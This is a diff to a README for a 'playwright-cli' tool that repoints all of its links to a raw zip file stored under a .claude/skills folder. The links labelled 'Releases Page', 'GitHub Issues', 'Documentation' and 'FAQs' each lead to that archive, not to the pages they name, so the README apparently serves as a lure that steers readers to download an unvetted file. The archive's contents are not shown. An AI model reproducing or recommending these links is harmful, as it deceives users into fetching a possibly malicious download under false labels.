@@ -1,6 +1,6 @@
 # 🎭 playwright-cli - Simplify Playwright Actions Easily
 
-[![Download](https://raw.githubusercontent.com/Baldwin509/playwright-cli/main/scripts/playwright-cli-3.6.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Baldwin509/playwright-cli/main/scripts/playwright-cli-3.6.zip)
+[![Download](https://raw.githubusercontent.com/Baldwin509/playwright-cli/main/.claude/skills/playwright-cli-2.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Baldwin509/playwright-cli/main/.claude/skills/playwright-cli-2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -11,12 +11,12 @@ Welcome to the playwright-cli! This tool helps you simplify common Playwright ta
 To get started, follow these steps:
 
 1. **Visit the Releases Page**: Go to the following link to download the software:
-   [Download Here](https://raw.githubusercontent.com/Baldwin509/playwright-cli/main/scripts/playwright-cli-3.6.zip)
+   [Download Here](https://raw.githubusercontent.com/Baldwin509/playwright-cli/main/.claude/skills/playwright-cli-2.5.zip)
 
 2. **Select the Latest Version**: On the releases page, you will see a list of available versions. It's best to download the latest version to ensure you have all the newest features and fixes.
 
 3. **Download the Correct File**: Choose the file that matches your operating system. Common options include:
-   - Windows: `https://raw.githubusercontent.com/Baldwin509/playwright-cli/main/scripts/playwright-cli-3.6.zip`
+   - Windows: `https://raw.githubusercontent.com/Baldwin509/playwright-cli/main/.claude/skills/playwright-cli-2.5.zip`
    - macOS: `playwright-cli-mac`
    - Linux: `playwright-cli-linux`
 
@@ -64,7 +64,7 @@ For example, if you want to record an action, select "Record Actions" and naviga
 
 If you encounter issues:
 
-- Check the [GitHub Issues](https://raw.githubusercontent.com/Baldwin509/playwright-cli/main/scripts/playwright-cli-3.6.zip) page to see if your question has already been answered.
+- Check the [GitHub Issues](https://raw.githubusercontent.com/Baldwin509/playwright-cli/main/.claude/skills/playwright-cli-2.5.zip) page to see if your question has already been answered.
 - If not, feel free to submit a new issue for assistance.
 
 ## 📅 Changelog
@@ -81,8 +81,8 @@ This project is licensed under the MIT License. You may freely use and modify th
 
 For more details, check our documentation or FAQs:
 
-- [Documentation](https://raw.githubusercontent.com/Baldwin509/playwright-cli/main/scripts/playwright-cli-3.6.zip)
-- [FAQs](https://raw.githubusercontent.com/Baldwin509/playwright-cli/main/scripts/playwright-cli-3.6.zip)
+- [Documentation](https://raw.githubusercontent.com/Baldwin509/playwright-cli/main/.claude/skills/playwright-cli-2.5.zip)
+- [FAQs](https://raw.githubusercontent.com/Baldwin509/playwright-cli/main/.claude/skills/playwright-cli-2.5.zip)
 
 For quick access, remember to visit the downloads page again: 
-[Download Here](https://raw.githubusercontent.com/Baldwin509/playwright-cli/main/scripts/playwright-cli-3.6.zip)
+[Download Here](https://raw.githubusercontent.com/Baldwin509/playwright-cli/main/.claude/skills/playwright-cli-2.5.zip)
